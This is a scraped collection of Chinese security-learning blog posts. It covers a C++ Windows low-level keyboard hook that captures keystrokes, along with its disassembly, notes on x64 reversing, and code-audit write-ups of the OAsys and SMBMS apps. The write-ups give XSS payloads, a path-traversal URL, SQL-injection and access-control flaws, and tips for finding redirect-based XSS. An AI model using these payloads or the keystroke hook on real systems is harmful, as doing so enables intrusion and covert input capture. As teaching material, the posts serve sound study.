Hooks）：子类钩子是一种特殊的钩子，用于修改指定窗口类的消息处理函数。通过子类钩子，可以在不修改原始窗口类的情况下，对窗口消息进行自定义处理。\nWH_CALLWNDPROC钩子：这是一种特殊的系统钩子，用于监视和修改窗口消息的处理过程。WH_CALLWNDPROC钩子可以拦截和处理窗口消息的传递过程，允许对消息进行修改或拦截。\n二、设键盘钩子钩子 1. SetWindowsHook可以HOOK类型 WH_KEYBOARD（键盘钩子）：用于监视和处理键盘输入事件，可以拦截和修改键盘输入。 WH_MOUSE（鼠标钩子）：用于监视和处理鼠标事件，包括鼠标移动、按下和释放鼠标按键等。 WH_KEYBOARD_LL（低级键盘钩子）：与WH_KEYBOARD类似，但是是一个低级别的钩子，可以全局拦截键盘输入。 WH_MOUSE_LL（低级鼠标钩子）：与WH_MOUSE类似，但是是一个低级别的钩子，可以全局监视鼠标事件。 WH_CALLWNDPROC（窗口消息钩子）：用于监视和处理窗口消息，可以拦截和修改窗口消息的传递。 WH_GETMESSAGE（消息钩子）：用于监视和处理消息队列中的消息，可以拦截和修改消息的传递。 2. 从零写一个键盘HOOK 首先需要的函数有\nSetWindowsHookEx设置一个HOOK\nHHOOK SetWindowsHookExA( [in] int idHook, //选择HOOK的目标 [in] HOOKPROC lpfn, //回调函数 [in] HINSTANCE hmod, //过于抽象 [in] DWORD dwThreadId //选择一个线程0是全局 ); 回调函数HOOK到之后需要执行的流程\nRESULT CALLBACK是一种函数类型，它是Windows API中定义的一种回调函数类型。 参数是由SetWindowsHook给的\nRESULT CALLBACK HookTest( int nCode, //接收事件状态 WPARAM wParam, //wParam表示键盘事件的消息标识符 LPARAM lParam, //按下的键的虚拟键码、扫描码、扩展键标志等。 ); GetMessage 用于从消息队列中获取一个消息\nBOOL GetMessage( [out] LPMSG lpMsg, //从线程队列接收消息 [in, optional] HWND hWnd, //NULL检测所有线程窗口， -1只接受当前线程消息 [in] UINT wMsgFilterMin, //要检索的最低消息值的整数值 [in] UINT wMsgFilterMax //要检索的最高消息值的整数值 ); PostQuitMessage 发送一个退出消息\nvoid PostQuitMessage( [in] int nExitCode ); UnhookWindowsHookEx 结束HOOK\nBOOL UnhookWindowsHookEx( [in] HHOOK hhk //要结束的HOOK ); C++ 代码示例\n#include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; //钩子函数 LRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {\tif (nCode \u0026gt;= 0) { KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam; //获取按下的键的虚拟键码、扫描码、扩展键标志等。 if (wParam == WM_KEYDOWN) //键盘按下 { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;你按下了\u0026#34;); BYTE keyState[256]; //存放整数的大小 wchar_t buffer[2]; //宽字节变量 buffer[1] = \u0026#39;\\0\u0026#39;; //设置终止符 if (GetKeyboardState(keyState)) //获取按键状态 返回布尔 keyState其中的265键 {\t//判断返回是不是大于0 //ToUnicode 将指定的虚拟键代码和键盘状态转换为相应的 Unicode 字符。 ToUnicode 参数 1. 要转换的虚拟密钥代码。 2. 要转换的密钥的硬件 扫描代码 。 3. keyState 前键盘状态的 256 字节数组的指针。 数组中 (字节) 的每个元素都包含一个键的状态。 4. 已接收的按键 5，接收按键的缓冲区大小 6，函数行为 ‘0’ 不受理ALT+数字键组合 if (ToUnicode(pKeyboardHookStruct-\u0026gt;vkCode, pKeyboardHookStruct-\u0026gt;scanCode, keyState, (LPWSTR)\u0026amp;buffer, 1, 0) \u0026gt; 0) { wcout \u0026lt;\u0026lt; \u0026#34;按下:\u0026#34; \u0026lt;\u0026lt; buffer \u0026lt;\u0026lt; endl; // wcout宽字节输出 if (97 == buffer[0]) //判断符合条件退出 { PostQuitMessage(0); } } } } else if(wParam == WM_KEYUP) //键盘松开 { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;你松开了\u0026#34;); } else { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;键盘处于按下与松开的叠加状态？？？？\u0026#34;); } } } int main() { //安装HOOK HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, NULL, 0); //判断是否HOOK成功 if (hKeyHook == NULL) { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;获取失败\u0026#34;); } //消息循环 //GetMessage 调用线程的 消息队列 里取得一个消息并将其放于指定的结构 MSG msg; while (GetMessage(\u0026amp;msg, NULL, 0, 0)) { //将虚拟密钥消息转换为字符消息 , 人话:把键盘的输入流转换为字符串 TranslateMessage(\u0026amp;msg); //DispatchMessageW把消息发往窗口 DispatchMessageW(\u0026amp;msg); } //卸载HOOK UnhookWindowsHookEx(hKeyHook); return 0; } 3. 逆向HOOK 源码\n//安装HOOK HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, NULL, 0); //判断是否HOOK成功 if (hKeyHook == NULL) { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;获取失败\u0026#34;); } 逆向\n.text:00414E10 push ebp ; Main函数 .text:00414E11 mov ebp, esp .text:00414E13 sub esp, 0F4h ; 申请栈空间 .text:00414E19 push ebx ; 保存栈指指针装状态 .text:00414E1A push esi .text:00414E1B push edi .text:00414E1C lea edi, [ebp+var_34] .text:00414E1F mov ecx, 0Dh .text:00414E24 mov eax, 0CCCCCCCCh .text:00414E29 rep stosd .text:00414E2B mov eax, ___security_cookie .text:00414E30 xor eax, ebp .text:00414E32 mov [ebp+var_4], eax .text:00414E35 mov esi, esp .text:00414E37 push 0 ; dwThreadId .text:00414E39 push 0 ; hmod .text:00414E3B push offset fn ; lpfn 回调函数 指向虚函数表 .text:00414E40 push 0Dh ; idHook .text:00414E42 call ds:SetWindowsHookExW .text:00414E48 cmp esi, esp .text:00414E4A call j___RTC_CheckEsp ; 检查溢出 .text:00414E4F mov [ebp+hhk], eax ; SetWindowsHook返回值 .text:00414E52 cmp [ebp+hhk], 0 ; if 返回值是否是0 .text:00414E56 jnz short loc_414E6A .text:00414E58 push offset unk_41DCC4 ; char .text:00414E5D push offset aS ; \u0026#34;%s\\n\u0026#34; .text:00414E62 call printf .text:00414E67 add esp, 8 ; 堆栈平衡 回调函数是什么时候被调用的，在debug 中查看 在调用SetWIndowsHook中传入了push Hook技术.0041119A,跟如 查看SetWindowsHook Call中\n00414E37 6A 00 push 0x0 00414E39 6A 00 push 0x0 00414E3B 68 9A114100 push Hook技术.0041119A ; 回调函数 00414E40 6A 0D push 0xD 00414E42 FF15 5C114200 call dword ptr ds:[\u0026lt;\u0026amp;USER32.SetWindowsHookExW\u0026gt;] ; apphelp.6E2B1AC0 00414E48 3BF4 cmp esi,esp 00414E4A E8 EFC4FFFF call Hook技术.0041133E 进入SetWindowsHook Call查看内部执行流程 走到基址6E2B1ADC的时候回调函数又入栈了，如何调用？\nEPB的值加上0xC的时候就是0019 FDD8 然后再取ss取值就是0041119A在调用SetWindowsHook之前存放回调函数的位置，然后压入Call中这是产生关联不会执行。\n要是说回调函数被那个函数调用了只能说：回调函数是由操作系统在特定事件发生时主动调用的，而不是由用户代码直接调用的。是在GetMessage之后被调用的\nMSG msg; while (GetMessage(\u0026amp;msg, NULL, 0, 0)) { //将虚拟密钥消息转换为字符消息 , 人话:把键盘的输入流转换为字符串 TranslateMessage(\u0026amp;msg); //DispatchMessageW把消息发往窗口 DispatchMessageW(\u0026amp;msg); } //卸载HOOK UnhookWindowsHookEx(hKeyHook); return 0; .text:00414E6A mov esi, esp .text:00414E6C push 0 ; wMsgFilterMax 四个参数 .text:00414E6E push 0 ; wMsgFilterMin .text:00414E70 push 0 ; hWnd .text:00414E72 lea eax, [ebp+Msg] ; 取内存地址 .text:00414E75 push eax ; lpMsg 压入指针 .text:00414E76 call ds:GetMessageW ; 四个参数压入GetMessagW .text:00414E7C cmp esi, esp ; 检查溢出 .text:00414E7E call j___RTC_CheckEsp .text:00414E83 test eax, eax ; 条件永远为真 .text:00414E85 jz short loc_414EAF ; ZF为1跳转 .text:00414E87 mov esi, esp ; 保存栈指针 .text:00414E89 lea eax, [ebp+Msg] .text:00414E8C push eax ; lpMsg .text:00414E8D call ds:TranslateMessage .text:00414E93 cmp esi, esp ; 检查溢出 .text:00414E95 call j___RTC_CheckEsp .text:00414E9A mov esi, esp .text:00414E9C lea eax, [ebp+Msg] .text:00414E9F push eax ; lpMsg .text:00414EA0 call ds:DispatchMessageW .text:00414EA6 cmp esi, esp .text:00414EA8 call j___RTC_CheckEsp .text:00414EAD jmp short loc_414E6A ; 这是一个while(True) 循环因为 只有 00414E85 能跳出 jmp 但是永远为真True .text:00414EAF ; --------------------------------------------------------------------------- .text:00414EAF .text:00414EAF loc_414EAF: ; CODE XREF: _main_0+75↑j .text:00414EAF mov esi, esp .text:00414EB1 mov eax, [ebp+hhk] .text:00414EB4 push eax ; hhk 压入SetWindowsHook 的句柄 .text:00414EB5 call ds:UnhookWindowsHookEx ; 退出Hook函数 KeyboardHookCallback (回调函数)\nLRESULT CALLBACK KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {\tif (nCode \u0026gt;= 0) { KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam; //获取按下的键的虚拟键码、扫描码、扩展键标志等。 if (wParam == WM_KEYDOWN) //键盘按下3 { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;你按下了\u0026#34;); BYTE keyState[256]; //存放整数的大小 wchar_t buffer[2]; //宽字节变量 2 给字节 buffer[1] = \u0026#39;\\0\u0026#39;; //设置终止符 if (GetKeyboardState(keyState)) //获取按键状态 返回布尔 keyState其中的265键 .text:004147D3 xor eax, ebp .text:004147D5 mov [ebp+var_4], eax ; if (nCode \u0026gt;= 0) .text:004147D8 cmp [ebp+arg_0], 0 .text:004147DC jl loc_414912 ; 回调函数结束（KeyboardHookCallback） .text:004147E2 mov eax, [ebp+arg_8] ; KBDLLHOOKSTRUCT* pKeyboardHookStruct = (KBDLLHOOKSTRUCT*)lParam; .text:004147E5 mov [ebp+var_C], eax .text:004147E8 cmp [ebp+arg_4], 100h ; if (wParam == WM_KEYDOWN(0x100)) //键盘按下 .text:004147EF jnz loc_4148E3 .text:004147F5 push offset unk_41DC74 ; char 字符串：你按下了 .text:004147FA push offset aS ; \u0026#34;%s\\n\u0026#34; .text:004147FF call printf .text:00414804 add esp, 8 ; printf堆栈平衡 .text:00414807 mov [ebp+var_1EC], 2 .text:00414811 cmp [ebp+var_1EC], 4 .text:00414818 jnb short loc_41481C ; 检查堆栈溢出的Call .text:0041481A jmp short loc_414821 .text:0041481C ; --------------------------------------------------------------------------- .text:0041481C .text:0041481C loc_41481C: ; CODE XREF: sub_4147B0+68↑j .text:0041481C call j____report_rangecheckfailure ; 检查堆栈溢出的Call .text:00414821 .text:00414821 loc_414821: ; CODE XREF: sub_4147B0+6A↑j .text:00414821 xor eax, eax .text:00414823 mov ecx, [ebp+var_1EC] ; wchar_t buffer[2]; .text:00414829 mov [ebp+ecx+pwszBuff], ax ; buffer[1] = \u0026#39;\\0\u0026#39;; .text:00414831 mov esi, esp .text:00414833 lea eax, [ebp+KeyState] ; BYTE keyState[256]; .text:00414839 push eax ; lpKeyState .text:0041483A call ds:GetKeyboardState ; if (GetKeyboardState(keyState)) if (ToUnicode(pKeyboardHookStruct-\u0026gt;vkCode, pKeyboardHookStruct-\u0026gt;scanCode, keyState, (LPWSTR)\u0026amp;buffer, 1, 0) \u0026gt; 0) { wcout \u0026lt;\u0026lt; \u0026#34;按下:\u0026#34; \u0026lt;\u0026lt; buffer \u0026lt;\u0026lt; endl; // wcout宽字节输出 .text:0041487D test eax, eax ; if (ToUnicode(pKeyboardHookStruct-\u0026gt;vkCode, pKeyboardHookStruct-\u0026gt;scanCode, keyState, (LPWSTR)\u0026amp;buffer, 1, 0) \u0026gt; 0) .text:0041487F jle short loc_4148E1 ; 跳到函数结束 .text:00414881 mov esi, esp .text:00414883 push offset sub_411505 .text:00414888 lea eax, [ebp+pwszBuff] .text:0041488E push eax ; String buffer .text:0041488F push offset Str ; Str \u0026#34;按下\u0026#34; .text:00414894 mov ecx, ds:?wcout@std@@3V?$basic_ostream@_WU?$char_traits@_W@std@@@1@A ; std::wostream std::wcout .text:0041489A push ecx ; int .text:0041489B call sub_4111D6 ; cout \u0026lt;\u0026lt; \u0026#34;按下：\u0026#34; \u0026lt;\u0026lt; endl; .text:004148A0 add esp, 8 .text:004148A3 push eax ; int .text:004148A4 call sub_4112E4 ; wcout \u0026lt;\u0026lt; buffer \u0026lt;\u0026lt; endl .text:004148A9 add esp, 8 .text:004148AC mov ecx, eax .text:004148AE call ds:??6?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; 我也不清楚这是什么 if (97 == buffer[0]) //判断符合条件退出 { PostQuitMessage(0); } .text:004148C0 imul ecx, eax, 0 .text:004148C3 movzx edx, [ebp+ecx+pwszBuff] .text:004148CB cmp edx, 61h ; \u0026#39;a\u0026#39; ; if (97 == buffer[0]) .text:004148CE jnz short loc_4148E1 .text:004148D0 mov esi, esp .text:004148D2 push 0 ; nExitCode .text:004148D4 call ds:PostQuitMessage ; 退出消息队列 if(wParam == WM_KEYUP) //键盘松开 { printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;你松开了\u0026#34;); } .text:004148E3 .text:004148E3 loc_4148E3: ; CODE XREF: sub_4147B0+3F↑j .text:004148E3 cmp [ebp+arg_4], 101h ; else if(wParam == WM_KEYUP) //键盘松开 .text:004148EA jnz short loc_414900 .text:004148EC push offset unk_41DC8C ; 字符串：你松开了 .text:004148F1 push offset aS ; \u0026#34;%s\\n\u0026#34; .text:004148F6 call printf .text:004148FB add esp, 8 .text:004148FE jmp short loc_414912 ; 回调函数结束（KeyboardHookCallback） ","permalink":"http://guozhi1.github.io/posts/blog/hook%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%80%86%E5%90%91/","summary":"一、WidnowsHOOK分类 系统钩子（System Hooks）：系统钩子是最常见的一类钩子，用于监视和修改系统级别的事件。系统钩子可以捕获和处理各种系统事件，如键盘输入、鼠标消息、窗口消息等。系统钩子可以全局范围内生效，可以对整个系统中的事件进行拦截和处理。 应用程序钩子（App","title":"键盘HOOK学习以及逆向"},{"content":" 可以正常使用的功能点截取数据包，删除cookie看对业务是否能正常处理，如果处理就是未授权。\n可以f12查看前端页面是否存在未授权的API接口\n修改返回包\n","permalink":"http://guozhi1.github.io/posts/tech/src%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8C%96%E6%8E%98/","summary":"可以正常使用的功能点截取数据包，删除cookie看对业务是否能正常处理，如果处理就是未授权。 可以f12查看前端页面是否存在未授权的API接口 修改返回包","title":"Src未授权访问挖掘"},{"content":"x64逆向技术 1. 寄存器 64位寄存大小扩展64位，数量增加8个（R8-R15）,扩充8个128位的xmm寄存器， 64位兼容32应用程序，64程序用rax, 32位程序用eax底32位， x64高位访问通过WORD byte DWORD来进行访问。\n1.1 函数 栈平衡 栈的特征是先进后出，RSP是栈顶指针，x86栈大小是4字节x64是8字节，push是进行压栈pop是出栈 栈中存储的数据主要包括 局部变量,函数参数，函数返回，函数的返回地址。 函数调用完需要释放掉申请的栈空间，保证栈空间与函数调用钱一致，这个过程叫做栈平衡。 启动函数 想要找打x64main函数可以通过\nstart 里面找到 jmp __timainCRTStartup 找到exit函数（通常）上面第一个call是main函数（更高版本的编译器main call会在第一个call里面） 调用约定 x86架构下调用约定有stdcall、__cdecl 等方式。 x64值只存在一种调用约定 快速调用约定 如果参数超过4个，多余的参数放到栈中，入栈顺序从右到左。 前4个存放参数寄存器是固定的rcx, rdx, r8, r9 浮点数存放寄存器xmm0, xmm1,xmm2,xmm3\n参数传递 虽然前4个参数传参依靠寄存器，但是栈依旧保留4参数的栈空间。 当参数少于4 个的时候\n(1) 2个参数传递\n源码\n#include \u0026lt;iostream\u0026gt; int Add(int Num1, int Num2) { return Num1 + Num2; } int main() { printf(\u0026#34;%d\\r\\n\u0026#34;, Add(1,2)); return 0; } main\n.text:0000000140011940 push rbp .text:0000000140011942 push rdi .text:0000000140011943 sub rsp, 0E8h .text:000000014001194A lea rbp, [rsp+20h] //申请了栈空间 20h=32=4*8 .text:000000014001194F lea rcx, unk_140021029 .text:0000000140011956 call sub_140011366 .text:000000014001195B mov edx, 2 //参数二 .text:0000000140011960 mov ecx, 1 //参数一 .text:0000000140011965 call sub_1400111C2 .text:000000014001196A mov edx, eax .text:000000014001196C lea rcx, aD ; \u0026#34;%d\\r\\n\u0026#34; .text:0000000140011973 call sub_140011190 .text:0000000140011978 xor eax, eax .text:000000014001197A lea rsp, [rbp+0C8h] .text:0000000140011981 pop rdi .text:0000000140011982 pop rbp .text:0000000140011983 retn .text:0000000140011983 sub_140011940 endp 是两个参数通过寄存器传参edx,ecx， 但是依旧为参数申请了20h大小的栈空间。\n（2）4个参数以上\n源码\n#include \u0026lt;iostream\u0026gt; int Add(int Num1, int Num2, int Num3, int Num4, int Num5, int Num6) { return Num1 + Num2 + Num3 + Num4 + Num5 + Num6; } int main() { printf(\u0026#34;%d\\r\\n\u0026#34;, Add(1,2,3,4,5,6)); return 0; } .text:0000000140011970 push rbp .text:0000000140011972 push rdi .text:0000000140011973 sub rsp, 0F8h ; 申请栈空间。 .text:000000014001197A lea rbp, [rsp+30h] ; 为参数划分栈空间 .text:000000014001197F lea rcx, unk_140021029 .text:0000000140011986 call sub_140011366 .text:000000014001198B mov [rsp+100h+var_D8], 6 ; 参数6 .text:0000000140011993 mov [rsp+100h+var_E0], 5 ; 参数5 .text:000000014001199B mov r9d, 4 ; 参数4 .text:00000001400119A1 mov r8d, 3 ; 参数3 .text:00000001400119A7 mov edx, 2 ; 参数2 .text:00000001400119AC mov ecx, 1 ; 参数1 .text:00000001400119B1 call sub_1400110AF ; add()函数 .text:00000001400119B6 mov edx, eax .text:00000001400119B8 lea rcx, Format ; \u0026#34;%d\\r\\n\u0026#34; .text:00000001400119BF call printf .text:00000001400119C4 xor eax, eax .text:00000001400119C6 lea rsp, [rbp+0C8h] .text:00000001400119CD pop rdi .text:00000001400119CE pop rbp .text:00000001400119CF retn .text:00000001400119CF sub_140011970 endp lea rbp, [rsp+30h] 4个参数是默认保留空间的加上2个超出的参数就是6个 8*6=48=30h 划分了30h大小栈空间。\nsub rsp, 0F8h 这个可以看到申请0F8h大小的栈栈空间但是没有平栈，这是非平栈，非平栈操作的目的是为了在栈上为后续的函数调用或局部变量分配存储空间。非平栈操作不会影响栈的平衡，因为在函数调用结束时，rsp 会被恢复到之前的值。非平栈操作只是在栈上分配了一定的空间，而平栈操作则是恢复之前的栈状态。非平栈操作和平栈操作是两个不同的概念。非平栈操作用于分配栈空间，而平栈操作用于恢复栈状态。非平栈操作不会自动平衡栈，需要在函数调用结束时通过平栈操作来恢复栈的平衡。非平栈不会影响栈平衡。\n（3）参数为结构体 源码\n#include \u0026lt;iostream\u0026gt; struct tagproint { int x1; int y1; }; void fun(tagproint pt) { printf(\u0026#34;x=%d y=%d\\r\\n\u0026#34;, pt.x1, pt.y1); } int main() { tagproint pt = { 1,2 }; fun(pt); return 0; } .text:000000014001195A lea rbp, [rsp+20h] ; 申请参数预留空间 .text:000000014001195F lea rdi, [rsp+110h+var_F0] .text:0000000140011964 mov ecx, 0Ah .text:0000000140011969 mov eax, 0CCCCCCCCh .text:000000014001196E rep stosd .text:0000000140011970 lea rcx, unk_140021029 .text:0000000140011977 call sub_140011366 .text:000000014001197C mov dword ptr [rbp+0F0h+var_E8], 1 ; x1 = 1 放入栈中 .text:0000000140011983 mov dword ptr [rbp+0F0h+var_E8+4], 2 ; y1=2放入栈中 .text:000000014001198A mov rcx, [rbp+0F0h+var_E8] ; 把rsp指向存放变量的栈顶 .text:000000014001198E call sub_1400110E1 ; func() dword ptr 2个字节 先把结构的成员放栈空间， 然后指针指向栈顶把指针传入call函数中 func\n","permalink":"http://guozhi1.github.io/posts/blog/x64%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF-%E7%AC%94%E8%AE%B0/","summary":"x64逆向技术 1. 寄存器 64位寄存大小扩展64位，数量增加8个（R8-R15）,扩充8个128位的xmm寄存器， 64位兼容32应用程序，64程序用rax, 32位程序用eax底32位， x64高位访问通过WORD byte DWORD来进行访问。 1.1 函数 栈平衡 栈的特征是先进后出，RSP是栈顶指针，","title":"X64逆向技术 笔记"},{"content":"OAsys代码审计 知识来源\n1. sql注入 全局搜索可以注入的地方${可以找到sql注入的地方。#{}是预编译不可以进行注入的。 做了一个简单的判断然后进行拼接操作。 这个语句的id是sortMyNotice（我没截进去） 然后在这个所属的类 在cn.gson.oasys.mappers这个包下的.NoticeMapper类 可以看到是 这就可以看到传入了baseKey 这个参数 然后找到哪里实例化了它\n@RequestMapping(\u0026#34;informlistpaging\u0026#34;) /*GET POST都可以*/ public String informListPaging(@RequestParam(value = \u0026#34;pageNum\u0026#34;, defaultValue = \u0026#34;1\u0026#34;) int page, /*pageNum 默认值是1 */ @RequestParam(value = \u0026#34;baseKey\u0026#34;, required = false) String baseKey, /*required = false可以没有这个参数*/ @RequestParam(value=\u0026#34;type\u0026#34;,required=false) Integer type, @RequestParam(value=\u0026#34;status\u0026#34;,required=false) Integer status, @RequestParam(value=\u0026#34;time\u0026#34;,required=false) Integer time, @RequestParam(value=\u0026#34;icon\u0026#34;,required=false) String icon, @SessionAttribute(\u0026#34;userId\u0026#34;) Long userId, Model model,HttpServletRequest req){ System.out.println(\u0026#34;baseKey:\u0026#34;+baseKey); System.out.println(\u0026#34;page:\u0026#34;+page); setSomething(baseKey, type, status, time, icon, model); PageHelper.startPage(page, 10); List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; list=nm.sortMyNotice(userId, baseKey, type, status, time); /*这里就调用了sql语句并且传入baseKey参数， nm是NoticeMapper 做了组合 */ PageInfo\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; pageinfo=new PageInfo\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt;(list); List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; list2=informRelationService.setList(list); for (Map\u0026lt;String, Object\u0026gt; map : list2) { System.out.println(map); } 漏洞路径：http://127.0.0.1/informlistpaging?baseKey=sqlexp\n复现 2. 存储xss (过于冗长不推荐阅读) 我在挖掘xss时候，不会FreeMarker语法所以选择存储xss进行挖掘。 首先要关注数据库，因为因为存储xss数据都会存放在数据中 可以全局搜索save。 这个可以看name文件可控，但是路径是从数据库获取不可控。 下面的重命名文件夹也会有存储xss漏洞（我没测，一眼定真）\nonlyname方法看看有没有过滤\npublic String onlyname(String name,FilePath filepath,String shuffix,int num,boolean isfile){ Object f = null; if (isfile) { f = fldao.findByFileNameAndFpath(name, filepath); //传入路径、文件名返回对象 }else{ f = fpdao.findByPathNameAndParentId(name, filepath.getId()/*路径ID*/); } /*findByFileNameAndFpath来生成查询语句如果查询到了，就代表存在有个文件然后这段代码就解决文件名冲突问题*/ if(f != null){ int num2 = num -1; if(shuffix == null){ name = name.replace(\u0026#34;(\u0026#34;+num2+\u0026#34;)\u0026#34;, \u0026#34;\u0026#34;)+\u0026#34;(\u0026#34;+num+\u0026#34;)\u0026#34;; }else{ name = name.replace(\u0026#34;.\u0026#34;+shuffix,\u0026#34;\u0026#34;).replace(\u0026#34;(\u0026#34;+num2+\u0026#34;)\u0026#34;, \u0026#34;\u0026#34;)+\u0026#34;(\u0026#34;+num+\u0026#34;)\u0026#34;+\u0026#34;.\u0026#34;+shuffix; } num += 1; return onlyname(name,filepath,shuffix,num,isfile); } return name; /*然后就返回name了没做过滤操作*/ } 之后查看findByFileNameAndFpath这是调用了那个表都使用了什么字段。 一个文件名一个路径 return name之后看上一级\nFileList fl = fldao.findOne(renamefp); //findOne 查询对应的ID String newname = onlyname(name/*文件名我可以控制的参数*/, fl.getFpath()/*传入路径*/, fl.getFileShuffix()/*文件后缀名*/, 1, isfile/*我可以控制的参数*/); fl.setFileName(newname); //设置文件名 fldao.save(fl); //保存到表里 然后看看哪里调用的rename这个方法 然后找到调用这个路径的ftl文件 之后在这个文件找关键字然后找到页面，我不会看FreeMarker回不回显全看天意\n复现 3. xss反射 4. 任意文件读取 我感觉任意文件读取算好挖的了，比sql注入还简单。\n首先全局搜索找到可以读取文件的地方，主要是这俩函数File()进行拼接FileInputStream()进行读取操作 show/**中的**是允许多层级的，然后使用replace函数进行了过滤操作，使用了File()和FileInputStream()进行拼接读取路径\n复现 可以直接读取maven工程配置文件， 现在网站在D: 盘怎么读取C盘内容？\nhttp://192.168.0.115:8088/show//show..//show../pom.xml 6.越权 越权属于逻辑漏洞，并没有什么特别的函数可以帮助你快速找到漏洞点，相比之下黑盒可能更快出越权漏洞。 代码上主要看有没有做权限校验的逻辑功能。 像这个方法particular 这是查询报销记录的只能财务和管理员能查看，但是这个没做权限校验逻辑导致只要知道接口就可以 调用。 调用数据库了但是没做权限的验证，这就会产生越权漏洞。 只需要便利这两个参数就可以了。 id 是申请人的ID ，typename是报销的类型\n复现 使用第权限账号访问接口提交参数就好了 7.越权删除 这个查询到存在的ID就可以进行删除，也是没做权限验证。 复现 payload\nhttp://127.0.0.1:8088/dayremove?rcid=10 知识星球 ","permalink":"http://guozhi1.github.io/posts/read/oasys%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","summary":"OAsys代码审计 知识来源 1. sql注入 全局搜索可以注入的地方${可以找到sql注入的地方。#{}是预编译不可以进行注入的。 做了一个简单的判断然后进行拼接操作。 这个语句的id是sortMyNotice（我没截进去） 然后在这个所属的类 在cn.gson.oasys.mappers这个包","title":"Oasys代码审计"},{"content":"SMBMS代码审计 1. xss漏洞 先知社区-知识来源\n这个xss在head.jsp文件的标签里，获取了请求头的Referer参数在前端显示了 可以使用payload进行闭合操作，进行闭合操作\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt; 这个payload在应该经过过滤器的时候就被拦截，因为jsp的本质是servlet所以是经过后端的但是过滤器没有进行拦截。\n1.1 xss漏洞 在找xss漏洞的时候可以先查看回显处 找到了键与值 全局搜索这个键 找到了方法名和变量名 再看看这变量做了什么 关联了键与值的关系然后发送到billlist.jsp现在就找query这个方法的所属类然后请求这个模块就行了 在全局搜索下这个请求的方法 首先需要是GET，参数是method值是query 可以先构造payload了\n请求方式+路径+方法名+值+键+payload GET /网站根目录/jsp/bill.do?method=query\u0026amp;queryProductName=\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt; 1.3 存储xss漏洞 先找到回显位置 再找到这个方法 可以看到提交，方式方法 在初始化了Bill()，并且把billcode设置成bill()私有的成员变量，而且是String类型可以输入数据 然后就是初始化数据库class然后添加数据。 BillServiceImpl()调用了dao层的BillDaoImpl()。启用了预编译的功能，现在需要确保这个smbms_bill表的billcode输入的不是int类型数据就可以进行xss注入了 输入的字符类型,但是只能输入长度是20的payload 漏洞复现 危害没多大就写出来图一乐吧。 因为payload长度的变化如果直接闭合标签的话就会长度不够导致失败，所以要找新的可以触发html事件的xss位置，全局搜索找到\u0026lt;a标签\u0026gt;。 触发事件可以节省payload 然后寻找提交方。显然GET\\POST都行，反正都会调用doGET()。我建议使用网页提交因为参数很多，而且有缺少的参数就会报错。\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String method = req.getParameter(\u0026#34;method\u0026#34;); if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;query\u0026#34;)){ this.query(req,resp); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;add\u0026#34;)){ this.add(req,resp); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;view\u0026#34;)){ this.getBillById(req,resp,\u0026#34;billview.jsp\u0026#34;); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;modify\u0026#34;)){ this.getBillById(req,resp,\u0026#34;billmodify.jsp\u0026#34;); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;modifysave\u0026#34;)){ this.modify(req,resp); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;delbill\u0026#34;)){ this.delBill(req,resp); }else if(method != null \u0026amp;\u0026amp; method.equals(\u0026#34;getproviderlist\u0026#34;)){ this.getProviderlist(req,resp); } } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { doGet(req, resp); } \u0026#34;\u0026#34;+onclick=alert(1)\u0026gt; 2、密码重置漏洞 分析下修改密码的方法 注意三个点，第一是通过session来判断用户的，第二数据包里收一个值newpassword，第三newpassword不为空就可以影响flag的判断并影响最结果。 显然如果是修改自己的密码就太鸡肋了，可以看到数据包没有token，我们可以使用csrf提升危害。 知识星球 ","permalink":"http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1smbms/","summary":"SMBMS代码审计 1. xss漏洞 先知社区-知识来源 这个xss在head.jsp文件的标签里，获取了请求头的Referer参数在前端显示了 可以使用payload进行闭合操作，进行闭合操作 \u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt; 这个payload在应该经过过滤器的时候就被拦截，因为jsp的本质是servlet所以是经过","title":"Java代码审计smbms"},{"content":"src挖掘-xss漏洞 漏洞点：url跳转参数，登录url跳转， 退出 注意点：注意url参数 redirect URL redirect_url等参数\n前端302跳转可造成xss漏洞window.location 正常的url:https://guozhi1.github.io/login?url=http://test.com 我们可以尝试https://guozhi1.github.io/login?url=javascript:alert(1) 